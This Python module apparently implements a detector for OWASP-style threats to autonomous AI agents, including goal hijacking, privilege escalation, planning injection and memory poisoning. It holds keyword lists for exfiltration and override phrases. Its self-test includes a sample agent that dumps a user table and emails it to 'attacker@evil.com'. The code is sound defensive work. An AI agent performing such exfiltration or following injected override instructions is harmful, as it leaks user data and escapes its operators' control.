"""
OWASP Agentic AI Top 10 Detector
Detects threats specific to autonomous AI agents
"""

import re
from collections import Counter
from dataclasses import dataclass


def _coerce_action(a):
    """Normalize an action-list entry to a dict.

    The AGENTIC01/02/03 detectors call ``.get()`` on each entry of
    ``current_actions`` / ``action_history`` / ``attempted_actions``. A non-dict
    entry — e.g. a bare string tool name — raised an uncaught ``AttributeError``,
    turning a security-scan request into an HTTP 500. Coerce bare values to a
    minimal ``{"action_name": ...}`` dict so detection degrades gracefully.
    """
    return a if isinstance(a, dict) else {"action_name": str(a)}


@dataclass
class AgenticThreatResult:
    threat_id: str
    threat_name: str
    detected: bool
    severity: str
    confidence: float
    details: dict


class OWASPAgenticDetector:
    """
    Detects OWASP Agentic AI Top 10 threats
    For autonomous AI agents
    """

    def __init__(self):
        self.threat_catalog = {
            "AGENTIC01": "Goal Hijacking",
            "AGENTIC02": "Infinite Loops",
            "AGENTIC03": "Privilege Escalation",
            "AGENTIC04": "Uncontrolled Resource Consumption",
            "AGENTIC05": "Agent Impersonation",
            "AGENTIC06": "State Manipulation",
            "AGENTIC07": "Multi-Agent Collusion",
            "AGENTIC08": "Planning Injection",
            "AGENTIC09": "Memory Poisoning",
            "AGENTIC10": "Tool Chain Exploitation",
        }

    def detect_agentic01_goal_hijacking(
        self, original_goal: str, current_actions: list[dict], agent_state: dict
    ) -> AgenticThreatResult:
        """
        AGENTIC01: Goal Hijacking
        Detect when agent's behavior deviates from original goal

        Args:
            original_goal: The agent's original task
            current_actions: List of {action_name, parameters} being executed
            agent_state: Current internal state of agent
        """
        # Extract keywords from original goal
        goal_keywords = set(self._extract_keywords(original_goal))

        # Dangerous action patterns that might indicate hijacking
        dangerous_actions = {
            "data_exfiltration": ["download", "export", "send", "upload", "transmit"],
            "system_manipulation": ["delete", "remove", "destroy", "modify", "alter"],
            "privilege_abuse": ["admin", "root", "sudo", "elevate", "escalate"],
            "resource_abuse": ["mine", "compute", "infinite", "loop", "fork"],
        }

        suspicious_actions = []
        goal_alignment_score = 0
        total_actions = len(current_actions)

        for action in current_actions:
            action_name = action.get("action_name", "").lower()
            action_params = str(action.get("parameters", "")).lower()
            action_text = f"{action_name} {action_params}"

            # Check if action aligns with goal keywords
            action_keywords = set(self._extract_keywords(action_text))
            keyword_overlap = len(goal_keywords & action_keywords)

            if keyword_overlap > 0:
                goal_alignment_score += 1

            # Check for dangerous patterns
            for threat_type, patterns in dangerous_actions.items():
                for pattern in patterns:
                    if pattern in action_text and keyword_overlap == 0:
                        suspicious_actions.append(
                            {
                                "action": action_name,
                                "threat_type": threat_type,
                                "pattern": pattern,
                                "alignment_score": keyword_overlap,
                            }
                        )

        # Calculate alignment ratio
        alignment_ratio = goal_alignment_score / total_actions if total_actions > 0 else 1.0

        # Detection criteria
        detected = len(suspicious_actions) > 0 or alignment_ratio < 0.3

        # Severity calculation
        if len(suspicious_actions) > 2:
            severity = "critical"
        elif len(suspicious_actions) > 0:
            severity = "high"
        elif alignment_ratio < 0.3:
            severity = "medium"
        else:
            severity = "none"

        return AgenticThreatResult(
            threat_id="AGENTIC01",
            threat_name="Goal Hijacking",
            detected=detected,
            severity=severity,
            confidence=0.8 if detected else 0.0,
            details={
                "suspicious_actions": suspicious_actions,
                "alignment_ratio": alignment_ratio,
                "goal_keywords": list(goal_keywords),
                "total_actions": total_actions,
            },
        )

    def detect_agentic02_infinite_loops(
        self, action_history: list[dict], max_repetitions: int = 5, window_size: int = 5
    ) -> AgenticThreatResult:
        """
        AGENTIC02: Infinite Loops
        Detect when agent is stuck in repetitive behavior

        Args:
            action_history: Recent actions [{action_name, timestamp, result}] or [{name}]
            max_repetitions: Maximum allowed consecutive repetitions
            window_size: Size of sliding window (min 5 to detect loops)
        """
        if len(action_history) < 3:
            return AgenticThreatResult(
                threat_id="AGENTIC02",
                threat_name="Infinite Loops",
                detected=False,
                severity="none",
                confidence=0.0,
                details={"reason": "insufficient_data"},
            )

        # Use available data (relaxed window)
        use_window = min(window_size, len(action_history))
        recent_actions = action_history[-use_window:]
        action_sequence = [a.get("action_name") or a.get("name") or str(a) for a in recent_actions]

        # Count consecutive repetitions
        consecutive_count = 1
        max_consecutive = 1
        prev_action = None

        for action in action_sequence:
            if action == prev_action:
                consecutive_count += 1
                max_consecutive = max(max_consecutive, consecutive_count)
            else:
                consecutive_count = 1
            prev_action = action

        # Detect cycles (e.g., A->B->A->B->A->B)
        cycles_detected = []

        # Check for 2-action cycles
        for i in range(len(action_sequence) - 3):
            if action_sequence[i] == action_sequence[i + 2] and action_sequence[i + 1] == action_sequence[i + 3]:
                cycle = f"{action_sequence[i]}->{action_sequence[i + 1]}"
                if cycle not in cycles_detected:
                    cycles_detected.append(cycle)

        # Check if same action repeated with no progress
        action_counts = Counter(action_sequence)
        high_frequency_actions = [
            {"action": action, "count": count} for action, count in action_counts.items() if count > max_repetitions
        ]

        detected = max_consecutive > max_repetitions or len(cycles_detected) > 0 or len(high_frequency_actions) > 0

        # Severity
        if max_consecutive > max_repetitions * 2 or len(cycles_detected) > 2:
            severity = "critical"
        elif max_consecutive > max_repetitions or len(cycles_detected) > 0:
            severity = "high"
        else:
            severity = "none"

        return AgenticThreatResult(
            threat_id="AGENTIC02",
            threat_name="Infinite Loops",
            detected=detected,
            severity=severity,
            confidence=0.85 if detected else 0.0,
            details={
                "max_consecutive_repetitions": max_consecutive,
                "threshold": max_repetitions,
                "cycles_detected": cycles_detected,
                "high_frequency_actions": high_frequency_actions,
            },
        )

    def detect_agentic03_privilege_escalation(
        self, agent_permissions: list[str], attempted_actions: list[dict]
    ) -> AgenticThreatResult:
        """
        AGENTIC03: Privilege Escalation
        Detect when agent tries actions beyond its permissions

        Args:
            agent_permissions: List of permitted action types
            attempted_actions: Actions the agent tried to execute
        """
        # Define permission hierarchy
        permission_hierarchy = {
            "read": ["read"],
            "write": ["read", "write"],
            "execute": ["read", "write", "execute"],
            "admin": ["read", "write", "execute", "admin"],
        }

        # Get all allowed actions based on permissions
        allowed_actions = set()
        for perm in agent_permissions:
            if perm in permission_hierarchy:
                allowed_actions.update(permission_hierarchy[perm])

        violations = []

        for action in attempted_actions:
            action_type = action.get("action_type", "").lower()
            action_name = action.get("action_name", "")

            # Map action to required permission
            required_perm = self._map_action_to_permission(action_type, action_name)

            if required_perm not in allowed_actions:
                violations.append(
                    {
                        "action_name": action_name,
                        "action_type": action_type,
                        "required_permission": required_perm,
                        "agent_permissions": agent_permissions,
                    }
                )

        detected = len(violations) > 0

        # Check severity based on what was attempted
        critical_violations = [v for v in violations if v["required_permission"] in ["admin", "execute"]]

        if critical_violations:
            severity = "critical"
        elif violations:
            severity = "high"
        else:
            severity = "none"

        return AgenticThreatResult(
            threat_id="AGENTIC03",
            threat_name="Privilege Escalation",
            detected=detected,
            severity=severity,
            confidence=0.9 if detected else 0.0,
            details={
                "violations": violations,
                "total_violations": len(violations),
                "critical_violations": len(critical_violations),
            },
        )

    def detect_agentic04_resource_consumption(self, resource_usage: dict, limits: dict) -> AgenticThreatResult:
        """
        AGENTIC04: Uncontrolled Resource Consumption
        Detect excessive resource usage by agent

        Args:
            resource_usage: {cpu_percent, memory_mb, api_calls, tokens_used}
            limits: {max_cpu, max_memory, max_api_calls, max_tokens}
        """
        violations = []

        # Check CPU
        if resource_usage.get("cpu_percent", 0) > limits.get("max_cpu", 80):
            violations.append({"resource": "CPU", "usage": resource_usage["cpu_percent"], "limit": limits["max_cpu"]})

        # Check Memory
        if resource_usage.get("memory_mb", 0) > limits.get("max_memory", 1000):
            violations.append(
                {"resource": "Memory", "usage": resource_usage["memory_mb"], "limit": limits["max_memory"]}
            )

        # Check API calls
        if resource_usage.get("api_calls", 0) > limits.get("max_api_calls", 100):
            violations.append(
                {"resource": "API Calls", "usage": resource_usage["api_calls"], "limit": limits["max_api_calls"]}
            )

        # Check Token usage
        if resource_usage.get("tokens_used", 0) > limits.get("max_tokens", 10000):
            violations.append(
                {"resource": "Tokens", "usage": resource_usage["tokens_used"], "limit": limits["max_tokens"]}
            )

        detected = len(violations) > 0

        # Severity based on how many resources exceeded
        if len(violations) >= 3:
            severity = "critical"
        elif len(violations) >= 2:
            severity = "high"
        elif len(violations) >= 1:
            severity = "medium"
        else:
            severity = "none"

        return AgenticThreatResult(
            threat_id="AGENTIC04",
            threat_name="Uncontrolled Resource Consumption",
            detected=detected,
            severity=severity,
            confidence=0.95 if detected else 0.0,
            details={"violations": violations, "violation_count": len(violations)},
        )

    def detect_agentic08_planning_injection(self, agent_plan: list[str], original_goal: str) -> AgenticThreatResult:
        """
        AGENTIC08: Planning Injection
        Detect if agent's plan has been manipulated

        Args:
            agent_plan: List of planned steps
            original_goal: The original task
        """
        # Suspicious plan elements
        suspicious_keywords = [
            "ignore",
            "disregard",
            "instead",
            "actually",
            "real task",
            "true goal",
            "forget",
            "override",
        ]

        plan_text = " ".join(agent_plan).lower()

        injections_found = []
        for keyword in suspicious_keywords:
            if keyword in plan_text:
                injections_found.append(keyword)

        # Check if plan steps deviate from goal
        goal_keywords = set(self._extract_keywords(original_goal))
        plan_keywords = set(self._extract_keywords(plan_text))

        overlap = len(goal_keywords & plan_keywords)
        alignment_score = overlap / len(goal_keywords) if goal_keywords else 0

        detected = len(injections_found) > 0 or alignment_score < 0.2

        if len(injections_found) > 2:
            severity = "critical"
        elif len(injections_found) > 0:
            severity = "high"
        elif alignment_score < 0.2:
            severity = "medium"
        else:
            severity = "none"

        return AgenticThreatResult(
            threat_id="AGENTIC08",
            threat_name="Planning Injection",
            detected=detected,
            severity=severity,
            confidence=0.75 if detected else 0.0,
            details={
                "injections_found": injections_found,
                "alignment_score": alignment_score,
                "plan_steps": len(agent_plan),
            },
        )

    def detect_agentic05_agent_impersonation(
        self, agent_state: dict, current_actions: list[dict], original_goal: str
    ) -> AgenticThreatResult:
        """
        AGENTIC05: Agent Impersonation
        Detect when actions suggest impersonation or unauthorized role assumption.
        """
        impersonation_patterns = [
            "impersonate", "pretend to be", "act as if", "pose as",
            "pretend as", "role_override", "identity_switch", "spoof",
        ]
        goal_lower = (original_goal or "").lower()
        state_str = str(agent_state or {}).lower()
        actions_str = " ".join(
            str(a.get("action_name", "")) + str(a.get("parameters", ""))
            for a in (current_actions or [])
        ).lower()
        combined = f"{goal_lower} {state_str} {actions_str}"
        found = [p for p in impersonation_patterns if p in combined]
        detected = len(found) > 0
        return AgenticThreatResult(
            threat_id="AGENTIC05",
            threat_name="Agent Impersonation",
            detected=detected,
            severity="high" if detected else "none",
            confidence=0.7 if detected else 0.0,
            details={"patterns_found": found},
        )

    def detect_agentic06_state_manipulation(
        self, agent_state: dict, current_actions: list[dict]
    ) -> AgenticThreatResult:
        """
        AGENTIC06: State Manipulation
        Detect when agent state or context appears to be tampered with.
        """
        manipulation_patterns = [
            "override", "corrupt", "inject", "poison", "tamper",
            "modify_state", "alter_context", "replace memory",
        ]
        state_str = str(agent_state or {}).lower()
        actions_str = " ".join(str(a) for a in (current_actions or [])).lower()
        combined = f"{state_str} {actions_str}"
        found = [p for p in manipulation_patterns if p in combined]
        detected = len(found) > 0
        return AgenticThreatResult(
            threat_id="AGENTIC06",
            threat_name="State Manipulation",
            detected=detected,
            severity="high" if detected else "none",
            confidence=0.7 if detected else 0.0,
            details={"patterns_found": found},
        )

    def detect_agentic07_multi_agent_collusion(
        self, action_history: list[dict], agent_state: dict
    ) -> AgenticThreatResult:
        """
        AGENTIC07: Multi-Agent Collusion
        Detect patterns suggesting coordination between multiple agents for malicious purposes.
        """
        collusion_patterns = ["relay", "chain", "handoff", "delegate_to", "forward_to"]
        history_str = " ".join(str(a) for a in (action_history or [])).lower()
        state_str = str(agent_state or {}).lower()
        combined = f"{history_str} {state_str}"
        found = [p for p in collusion_patterns if p in combined]
        # Also check for suspicious action diversity (many different tools in short span)
        if len(action_history or []) >= 5:
            actions = [a.get("action_name") or a.get("name") for a in action_history]
            unique = len(set(a for a in actions if a))
            if unique >= 4:
                found.append("high_action_diversity")
        detected = len(found) > 0
        return AgenticThreatResult(
            threat_id="AGENTIC07",
            threat_name="Multi-Agent Collusion",
            detected=detected,
            severity="medium" if detected else "none",
            confidence=0.6 if detected else 0.0,
            details={"patterns_found": found},
        )

    def detect_agentic09_memory_poisoning(
        self, agent_state: dict, action_history: list[dict]
    ) -> AgenticThreatResult:
        """
        AGENTIC09: Memory Poisoning
        Detect when agent memory/context appears to contain injected malicious content.
        """
        poisoning_patterns = [
            "forget", "erase", "replace memory", "inject", "poison",
            "corrupt context", "false memory", "fake recall",
        ]
        state_str = str(agent_state or {}).lower()
        history_str = " ".join(str(a) for a in (action_history or [])).lower()
        combined = f"{state_str} {history_str}"
        found = [p for p in poisoning_patterns if p in combined]
        detected = len(found) > 0
        return AgenticThreatResult(
            threat_id="AGENTIC09",
            threat_name="Memory Poisoning",
            detected=detected,
            severity="high" if detected else "none",
            confidence=0.75 if detected else 0.0,
            details={"patterns_found": found},
        )

    def detect_agentic10_tool_chain_exploitation(
        self, current_actions: list[dict], action_history: list[dict]
    ) -> AgenticThreatResult:
        """
        AGENTIC10: Tool Chain Exploitation
        Detect dangerous tool chaining (read -> write -> exfiltrate).
        """
        dangerous_chains = [
            (["read", "write"], "read_write_chain"),
            (["read", "execute"], "read_execute_chain"),
            (["query", "send"], "query_send_chain"),
        ]
        all_actions = []
        for a in (current_actions or []):
            name = (a.get("action_name") or a.get("name") or "").lower()
            if name:
                all_actions.append(name)
        for a in (action_history or []):
            name = (a.get("action_name") or a.get("name") or "").lower()
            if name and name not in all_actions:
                all_actions.append(name)
        actions_text = " ".join(all_actions)
        found = []
        for keywords, reason in dangerous_chains:
            if all(k in actions_text for k in keywords):
                found.append({"chain": keywords, "reason": reason})
        detected = len(found) > 0
        return AgenticThreatResult(
            threat_id="AGENTIC10",
            threat_name="Tool Chain Exploitation",
            detected=detected,
            severity="high" if detected else "none",
            confidence=0.8 if detected else 0.0,
            details={"chains_detected": found},
        )

    def _extract_keywords(self, text: str) -> list[str]:
        """Extract meaningful keywords from text"""
        # Remove common stopwords
        stopwords = {
            "the",
            "a",
            "an",
            "and",
            "or",
            "but",
            "in",
            "on",
            "at",
            "to",
            "for",
            "of",
            "with",
            "by",
            "is",
            "are",
            "was",
            "were",
        }

        words = re.findall(r"\b\w+\b", text.lower())
        keywords = [w for w in words if w not in stopwords and len(w) > 2]

        return keywords

    def _map_action_to_permission(self, action_type: str, action_name: str) -> str:
        """Map an action to required permission level"""
        action_lower = f"{action_type} {action_name}".lower()

        if any(word in action_lower for word in ["delete", "remove", "destroy", "admin"]):
            return "admin"
        elif any(word in action_lower for word in ["execute", "run", "launch"]):
            return "execute"
        elif any(word in action_lower for word in ["write", "create", "update", "modify"]):
            return "write"
        else:
            return "read"

    def scan(self, agent_data: dict) -> dict:
        """
        Perform complete Agentic AI security scan

        Args:
            agent_data: {
                "original_goal": str,
                "current_actions": [...],
                "agent_state": {...},
                "action_history": [...],
                "agent_permissions": [...],
                "attempted_actions": [...],
                "resource_usage": {...},
                "resource_limits": {...},
                "agent_plan": [...]
            }

        Returns:
            Complete scan results
        """
        results = {}

        # Robustness: action lists may carry bare-string entries (e.g. a plain tool
        # name) rather than {action_name,...} dicts; the detectors call .get() on each
        # entry, which would raise AttributeError -> HTTP 500 on a non-dict. Coerce to
        # dicts up front (a copy, so the caller's data is untouched). Dicts pass through.
        agent_data = {**agent_data}
        for _k in ("current_actions", "action_history", "attempted_actions", "agent_plan"):
            _v = agent_data.get(_k)
            if isinstance(_v, list):
                agent_data[_k] = [_coerce_action(a) for a in _v]

        # AGENTIC01: Goal Hijacking
        if all(k in agent_data for k in ["original_goal", "current_actions"]):
            results["AGENTIC01"] = self.detect_agentic01_goal_hijacking(
                agent_data["original_goal"], agent_data["current_actions"], agent_data.get("agent_state", {})
            )

        # AGENTIC02: Infinite Loops
        if "action_history" in agent_data:
            results["AGENTIC02"] = self.detect_agentic02_infinite_loops(agent_data["action_history"])

        # AGENTIC03: Privilege Escalation
        if all(k in agent_data for k in ["agent_permissions", "attempted_actions"]):
            results["AGENTIC03"] = self.detect_agentic03_privilege_escalation(
                agent_data["agent_permissions"], agent_data["attempted_actions"]
            )

        # AGENTIC04: Resource Consumption
        if all(k in agent_data for k in ["resource_usage", "resource_limits"]):
            results["AGENTIC04"] = self.detect_agentic04_resource_consumption(
                agent_data["resource_usage"], agent_data["resource_limits"]
            )

        # AGENTIC08: Planning Injection
        if all(k in agent_data for k in ["agent_plan", "original_goal"]):
            results["AGENTIC08"] = self.detect_agentic08_planning_injection(
                agent_data["agent_plan"], agent_data["original_goal"]
            )

        # AGENTIC05: Agent Impersonation
        if "current_actions" in agent_data:
            results["AGENTIC05"] = self.detect_agentic05_agent_impersonation(
                agent_data.get("agent_state", {}),
                agent_data["current_actions"],
                agent_data.get("original_goal", ""),
            )

        # AGENTIC06: State Manipulation
        if "current_actions" in agent_data:
            results["AGENTIC06"] = self.detect_agentic06_state_manipulation(
                agent_data.get("agent_state", {}),
                agent_data["current_actions"],
            )

        # AGENTIC07: Multi-Agent Collusion
        if "action_history" in agent_data:
            results["AGENTIC07"] = self.detect_agentic07_multi_agent_collusion(
                agent_data["action_history"],
                agent_data.get("agent_state", {}),
            )

        # AGENTIC09: Memory Poisoning
        if "action_history" in agent_data or "agent_state" in agent_data:
            results["AGENTIC09"] = self.detect_agentic09_memory_poisoning(
                agent_data.get("agent_state", {}),
                agent_data.get("action_history", []),
            )

        # AGENTIC10: Tool Chain Exploitation
        if "current_actions" in agent_data or "action_history" in agent_data:
            results["AGENTIC10"] = self.detect_agentic10_tool_chain_exploitation(
                agent_data.get("current_actions", []),
                agent_data.get("action_history", []),
            )

        # Calculate summary
        threat_count = sum(1 for r in results.values() if r.detected)
        critical_count = sum(1 for r in results.values() if r.severity == "critical")
        high_count = sum(1 for r in results.values() if r.severity == "high")

        if critical_count > 0:
            overall_severity = "critical"
            action = "terminate_agent"
        elif high_count > 0:
            overall_severity = "high"
            action = "pause_agent"
        elif threat_count > 0:
            overall_severity = "medium"
            action = "warn"
        else:
            overall_severity = "none"
            action = "allow"

        return {
            "scan_results": results,
            "summary": {
                "total_threats": threat_count,
                "critical_threats": critical_count,
                "high_threats": high_count,
                "overall_severity": overall_severity,
                "recommended_action": action,
            },
        }


# ============================================
# TESTING
# ============================================

if __name__ == "__main__":
    detector = OWASPAgenticDetector()

    # Test 1: Goal Hijacking
    print("=" * 60)
    print("TEST 1: Goal Hijacking Detection")
    print("=" * 60)

    test_data = {
        "original_goal": "Summarize the document about quarterly earnings",
        "current_actions": [
            {"action_name": "read_file", "parameters": {"path": "/docs/earnings.pdf"}},
            {"action_name": "download_database", "parameters": {"table": "all_users"}},
            {"action_name": "send_email", "parameters": {"to": "attacker@evil.com"}},
        ],
        "agent_state": {},
    }

    result = detector.scan(test_data)
    print(f"Overall Severity: {result['summary']['overall_severity']}")
    print(f"Action: {result['summary']['recommended_action']}")

    for threat_id, threat_result in result["scan_results"].items():
        if threat_result.detected:
            print(f"\n🚨 {threat_id}: {threat_result.threat_name}")
            print(f"   Severity: {threat_result.severity}")
            print(f"   Details: {threat_result.details}")

    # Test 2: Infinite Loops
    print("\n" + "=" * 60)
    print("TEST 2: Infinite Loop Detection")
    print("=" * 60)

    test_data = {
        "action_history": [
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:00", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:01", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:02", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:03", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:04", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:05", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:06", "result": "success"},
            {"action_name": "search_web", "timestamp": "2024-01-01T10:00:07", "result": "success"},
        ]
    }

    result = detector.scan(test_data)

    for threat_id, threat_result in result["scan_results"].items():
        if threat_result.detected:
            print(f"\n🚨 {threat_id}: {threat_result.threat_name}")
            print(f"   Severity: {threat_result.severity}")
            print(f"   Details: {threat_result.details}")

    # Test 3: Privilege Escalation
    print("\n" + "=" * 60)
    print("TEST 3: Privilege Escalation")
    print("=" * 60)

    test_data = {
        "agent_permissions": ["read"],
        "attempted_actions": [
            {"action_type": "read", "action_name": "read_file"},
            {"action_type": "write", "action_name": "create_file"},
            {"action_type": "admin", "action_name": "delete_all_users"},
        ],
    }

    result = detector.scan(test_data)

    for threat_id, threat_result in result["scan_results"].items():
        if threat_result.detected:
            print(f"\n🚨 {threat_id}: {threat_result.threat_name}")
            print(f"   Severity: {threat_result.severity}")
            print(f"   Details: {threat_result.details}")

    print("\n✅ Agentic AI Detector Testing Complete!")
